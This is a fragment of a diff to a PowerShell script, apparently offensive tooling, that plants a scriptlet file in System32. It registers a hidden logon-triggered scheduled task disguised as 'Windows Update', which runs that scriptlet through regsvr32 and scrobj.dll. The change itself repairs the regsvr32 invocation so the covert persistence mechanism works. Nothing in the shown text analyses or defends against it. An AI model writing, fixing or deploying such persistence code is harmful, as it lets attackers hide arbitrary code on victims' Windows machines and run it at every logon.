@@ -212,7 +212,7 @@ command = "' + $code + '"
 objShell.Run command,0
 Set objShell = Nothing'
 $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
-$accion = New-ScheduledTaskAction -Execute "c:\windows\system32\regsvr32.exe" -Argument "/s /n /u /i:c:\windows\system32\update.sct"
+$accion = New-ScheduledTaskAction -Execute "c:\windows\system32\regsvr32.exe" -Argument "/s /n /u /i:c:\windows\system32\update.sct scrobj.dll"
 $desencadenante = New-ScheduledTaskTrigger -AtLogOn
 $tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet -Hidden)
 $tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
